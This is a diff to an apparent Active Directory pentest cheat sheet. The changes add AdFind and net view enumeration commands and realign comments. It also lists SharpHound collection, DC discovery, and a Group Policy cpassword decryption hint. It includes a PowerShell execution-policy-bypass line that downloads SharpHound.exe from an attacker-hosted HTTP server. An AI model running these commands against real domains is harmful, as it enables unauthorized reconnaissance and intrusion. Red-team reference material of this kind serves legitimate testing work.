@@ -3,19 +3,30 @@ Active Directory
 
 # Recon
 
-nltest /domain_trusts                      Show domain trusts
-nltest /dclist:<domain>                    Show domain controllers for a given domain
-net group "domain admins" /domain          Show users in the domain admins Security Group
+net view /all                                     Show all shares
+net view /all /domain                             Show all shares in the domain
+nltest /domain_trusts /all_trusts                 Show domain trusts
+nltest /dclist:<domain>                           Show domain controllers for a given domain
+net localgroup "administrator"                    Show users in the local administrator group
+net group "domain admins" /domain                 Show users in the domain admins Security Group
 
-net user /domain                           Show all domain users
-net user <user> /domain                    Show all Security Groups a domain user belongs to
-net group /domain                          Show all Security Groups in a domain
+AdFind.exe -f "(objectcategory=person)"
+AdFind.exe -f "(objectcategory=computer)"
+AdFind.exe -f "(objectcategory=organizationalUnit)"
+AdFind.exe -sc trustdmp
+AdFind.exe -subnets -f "(objectCategory=subnet)"
+AdFind.exe -f "(objectcategory=group)"
+AdFind.exe -gcb -sc trustdmp
+
+net user /domain                                  Show all domain users
+net user <user> /domain                           Show all Security Groups a domain user belongs to
+net group /domain                                 Show all Security Groups in a domain
 
 - Other
-dig -t SRV _gc._tcp.lab.acme.org           Global catalog
-dig -t SRV _ldap._tcp.acme.org             LDAP servers
-dig -t SRV _kerberos._tcp.acme.org         Kerberos KDC
-dig -t SRV _kpasswd._tcp.acme.org          Kerberos password change server
+dig -t SRV _gc._tcp.lab.acme.org                  Global catalog
+dig -t SRV _ldap._tcp.acme.org                    LDAP servers
+dig -t SRV _kerberos._tcp.acme.org                Kerberos KDC
+dig -t SRV _kpasswd._tcp.acme.org                 Kerberos password change server
 
 nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='acme.org'"
 
@@ -61,8 +72,8 @@ python -m SimpleHTTPServer
 cd to a discrete, writable directory (C:\Users\<user>\Desktop)
 powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://192.168.1.5:8000/SharpHound.exe', 'SharpHound.exe')"
 
-SharpHound.exe -c LoggedOn                 Run the following as a user that has admin rights
-SharpHound.exe -c Session                  On subseqequent runs just collect session data
+SharpHound.exe -c LoggedOn                        Run the following as a user that has admin rights
+SharpHound.exe -c Session                         On subseqequent runs just collect session data
 
 This will generate a zip file
 
@@ -126,17 +137,17 @@ GetDecryptedCpassword 'AES 256-bit encrypted password'
 dsquery server
 get-netdomaincontroller
 net group “domain controllers” /domain
-net view \\<server>                        DCs contain SYSVOL and NETLOGON shares
-cmd.exe /c set                             LOGONSERVER variable
+net view \\<server>                               DCs contain SYSVOL and NETLOGON shares
+cmd.exe /c set                                    LOGONSERVER variable
 
 # Show DC in a specific domain
 dsquery server -domain <something.int>
 get-netdomaincontroller -domain <something.int>
-nslookup <something.int>	               Internally, this will likely return DCs that are DNS servers
-nslookup                                   pseudo-shell
+nslookup <something.int>                          Internally, this will likely return DCs that are DNS servers
+nslookup                                          pseudo-shell
     set type=all
     _ldap._tcp.<something.int>
-nbtstat -a                                 Look for the attribute 1C
+nbtstat -a                                        Look for the attribute 1C
 
 # Show DCs forest-wide
 dsquery server -forest
